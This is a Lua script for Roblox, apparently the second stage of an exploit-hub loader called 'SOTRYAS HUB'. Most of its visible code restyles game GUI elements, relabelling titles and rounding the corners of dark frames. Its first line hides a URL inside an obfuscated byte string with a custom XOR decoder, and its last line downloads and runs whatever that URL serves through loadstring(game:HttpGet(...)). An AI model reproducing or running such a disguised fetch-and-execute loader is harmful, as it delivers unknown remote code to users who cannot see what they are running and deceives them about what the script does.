
--[[ STAGE 2: VISUAL CORE ]]
local tCveIh6YM_8Y="\162\155\169\112\184\192\115\117\204\129\136\219\172\231\234\224\230\245\206\207\250\253\005\009\021\019\255\247\006\007\030\011\062\058\076\056\036\090\094\093\092\110\116\106\103\103\086\140\138\151\152\159\139\105\175\173\186\187\130\198\203\211\206\215\228\223\223\244\180\000\242\004\010\011\024\021\030\034\038\044\240\051\058\067\005\064\079\089\079\094\098\107\097\119\106\113\133\123\133\134\142\161\095\155\170\162\114\119\105\181\185\194\199\208"local m7nOXU_3J2ceDr4c=25 local _ZNbQvK5iOdBB49Svc=31 local M6ixeDmoqc3b0xgD7RrvQn=0 local ZKnKvCzMZ7lJIZFIa=5 local HJGY4V3HDkC1e88eh7Zw=6 local aZT3OZrCOrwd=true local iaclHQYDyrcMfGK=bit32 and bit32.bxor if not iaclHQYDyrcMfGK then iaclHQYDyrcMfGK=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local izS0qwX8ocwiO_mN7w={}for JWuIEVp8AAEVq8r_M=1,#tCveIh6YM_8Y do local QcUtz3uOCGpfF1=string.byte(tCveIh6YM_8Y,JWuIEVp8AAEVq8r_M)local Vo5a_2E8CwJ5L_yN4GWB7j=(_ZNbQvK5iOdBB49Svc+(JWuIEVp8AAEVq8r_M*ZKnKvCzMZ7lJIZFIa)+HJGY4V3HDkC1e88eh7Zw)%256 if M6ixeDmoqc3b0xgD7RrvQn==0 then QcUtz3uOCGpfF1=(QcUtz3uOCGpfF1-Vo5a_2E8CwJ5L_yN4GWB7j)%256 izS0qwX8ocwiO_mN7w[JWuIEVp8AAEVq8r_M]=string.char(iaclHQYDyrcMfGK(QcUtz3uOCGpfF1,m7nOXU_3J2ceDr4c))else QcUtz3uOCGpfF1=iaclHQYDyrcMfGK(QcUtz3uOCGpfF1,m7nOXU_3J2ceDr4c)izS0qwX8ocwiO_mN7w[JWuIEVp8AAEVq8r_M]=string.char((QcUtz3uOCGpfF1-Vo5a_2E8CwJ5L_yN4GWB7j)%256)end end local PYnxwyIkTsZ64bX_Z=table.concat(izS0qwX8ocwiO_mN7w)if aZT3OZrCOrwd then PYnxwyIkTsZ64bX_Z=string.reverse(PYnxwyIkTsZ64bX_Z)end local MdYOf1hWIT7u=PYnxwyIkTsZ64bX_Z
local HubName = "SOTRYAS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(MdYOf1hWIT7u))()
